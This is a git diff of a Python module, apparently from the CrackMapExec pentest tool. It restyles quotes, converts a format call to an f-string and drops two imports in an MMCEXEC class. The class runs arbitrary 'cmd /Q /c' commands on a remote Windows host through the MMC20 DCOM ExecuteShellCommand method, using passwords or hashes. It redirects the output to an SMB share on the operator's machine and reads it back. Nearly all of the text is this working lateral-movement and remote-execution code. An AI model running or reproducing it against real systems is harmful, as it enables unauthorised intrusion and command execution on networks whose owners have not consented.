@@ -39,8 +39,7 @@ from impacket.dcerpc.v5.dcomrt import OBJREF, FLAGS_OBJREF_CUSTOM, OBJREF_CUSTOM
     OBJREF_EXTENDED, OBJREF_STANDARD, FLAGS_OBJREF_HANDLER, FLAGS_OBJREF_STANDARD, FLAGS_OBJREF_EXTENDED, \
     IRemUnknown2, INTERFACE
 from impacket.dcerpc.v5.dtypes import NULL
-from impacket.examples import logger
-from impacket.smbconnection import SMBConnection, SMB_DIALECT, SMB2_DIALECT_002, SMB2_DIALECT_21
+
 
 class MMCEXEC:
     def __init__(self, host, share_name, username, password, domain, smbconnection, hashes=None):
@@ -121,10 +120,10 @@ class MMCEXEC:
 
     def exit(self):
         dispParams = DISPPARAMS(None, False)
-        dispParams['rgvarg'] = NULL
-        dispParams['rgdispidNamedArgs'] = NULL
-        dispParams['cArgs'] = 0
-        dispParams['cNamedArgs'] = 0
+        dispParams["rgvarg"] = NULL
+        dispParams["rgdispidNamedArgs"] = NULL
+        dispParams["cArgs"] = 0
+        dispParams["cNamedArgs"] = 0
 
         self.__quit[0].Invoke(self.__quit[1], 0x409, DISPATCH_METHOD, dispParams,
                                              0, [], [])
@@ -134,41 +133,41 @@ class MMCEXEC:
         self.__output = gen_random_string(6)
         local_ip = self.__smbconnection.getSMBServer().get_socket().getsockname()[0]
 
-        command = '/Q /c ' + data
+        command = "/Q /c " + data
         if self.__retOutput is True:
-            command += ' 1> ' + '\\\\{}\\{}\\{}'.format(local_ip, self.__share_name, self.__output) + ' 2>&1'
+            command += " 1> " + f"\\\\{local_ip}\\{self.__share_name}\\{self.__output}" + " 2>&1"
 
         dispParams = DISPPARAMS(None, False)
-        dispParams['rgdispidNamedArgs'] = NULL
-        dispParams['cArgs'] = 4
-        dispParams['cNamedArgs'] = 0
+        dispParams["rgdispidNamedArgs"] = NULL
+        dispParams["cArgs"] = 4
+        dispParams["cNamedArgs"] = 0
         arg0 = VARIANT(None, False)
-        arg0['clSize'] = 5
-        arg0['vt'] = VARENUM.VT_BSTR
-        arg0['_varUnion']['tag'] = VARENUM.VT_BSTR
-        arg0['_varUnion']['bstrVal']['asData'] = self.__shell
+        arg0["clSize"] = 5
+        arg0["vt"] = VARENUM.VT_BSTR
+        arg0["_varUnion"]["tag"] = VARENUM.VT_BSTR
+        arg0["_varUnion"]["bstrVal"]["asData"] = self.__shell
 
         arg1 = VARIANT(None, False)
-        arg1['clSize'] = 5
-        arg1['vt'] = VARENUM.VT_BSTR
-        arg1['_varUnion']['tag'] = VARENUM.VT_BSTR
-        arg1['_varUnion']['bstrVal']['asData'] = self.__pwd
+        arg1["clSize"] = 5
+        arg1["vt"] = VARENUM.VT_BSTR
+        arg1["_varUnion"]["tag"] = VARENUM.VT_BSTR
+        arg1["_varUnion"]["bstrVal"]["asData"] = self.__pwd
 
         arg2 = VARIANT(None, False)
-        arg2['clSize'] = 5
-        arg2['vt'] = VARENUM.VT_BSTR
-        arg2['_varUnion']['tag'] = VARENUM.VT_BSTR
-        arg2['_varUnion']['bstrVal']['asData'] = command
+        arg2["clSize"] = 5
+        arg2["vt"] = VARENUM.VT_BSTR
+        arg2["_varUnion"]["tag"] = VARENUM.VT_BSTR
+        arg2["_varUnion"]["bstrVal"]["asData"] = command
 
         arg3 = VARIANT(None, False)
-        arg3['clSize'] = 5
-        arg3['vt'] = VARENUM.VT_BSTR
-        arg3['_varUnion']['tag'] = VARENUM.VT_BSTR
-        arg3['_varUnion']['bstrVal']['asData'] = '7'
-        dispParams['rgvarg'].append(arg3)
-        dispParams['rgvarg'].append(arg2)
-        dispParams['rgvarg'].append(arg1)
-        dispParams['rgvarg'].append(arg0)
+        arg3["clSize"] = 5
+        arg3["vt"] = VARENUM.VT_BSTR
+        arg3["_varUnion"]["tag"] = VARENUM.VT_BSTR
+        arg3["_varUnion"]["bstrVal"]["asData"] = "7"
+        dispParams["rgvarg"].append(arg3)
+        dispParams["rgvarg"].append(arg2)
+        dispParams["rgvarg"].append(arg1)
+        dispParams["rgvarg"].append(arg0)
 
         self.__executeShellCommand[0].Invoke(self.__executeShellCommand[1], 0x409, DISPATCH_METHOD, dispParams,
                                              0, [], [])
@@ -182,7 +181,7 @@ class MMCEXEC:
 
         while True:
             try:
-                with open(os.path.join('/tmp', 'cme_hosted', self.__output), 'r') as output:
+                with open(os.path.join("/tmp", "cme_hosted", self.__output), "r") as output:
                     self.output_callback(output.read())
                 break
             except IOError:
